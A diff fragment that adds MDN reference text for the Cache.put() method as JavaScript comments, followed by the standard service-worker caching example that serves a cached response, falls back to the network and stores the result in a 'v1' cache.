+// you want to add to the cache.
+
+// response
+// The Response you want to match up to the request.
+
+// Return value
+// A Promise that resolves with undefined.
+
+// Exceptions
+// TypeError
+// Returned if the URL scheme is not http or https.
+
+// Examples
+// This example is from the MDN 
+// simple-service-worker example 
+// (see simple-service-worker running live). 
+// Here we wait for a FetchEvent to fire. 
+// We construct a custom response like so:
+
+// Check whether a match for the request is 
+// found in the CacheStorage using 
+// CacheStorage.match(). If so, serve that.
+
+// If not, open the v1 cache using open(), 
+// put the default network request in the 
+// cache using Cache.put() and return a 
+// clone of the default network request 
+// using return response.clone(). Clone 
+// is needed because put() consumes the response body.
+
+// If this fails (e.g., because the 
+// network is down), return a fallback response.
+
+// JS
+// Copy to Clipboard
+let response;
+const cachedResponse = caches
+  .match(event.request)
+  .then((r) => (r !== undefined ? r : fetch(event.request)))
+  .then((r) => {
+    response = r;
+    caches.open("v1").then((cache) => {
+      cache.put(event.request, response);
+    });
+    return response.clone();
+  })
+  .catch(() => caches.match("/gallery/myLittleVader.jpg"));
+
+
+
+
+
+
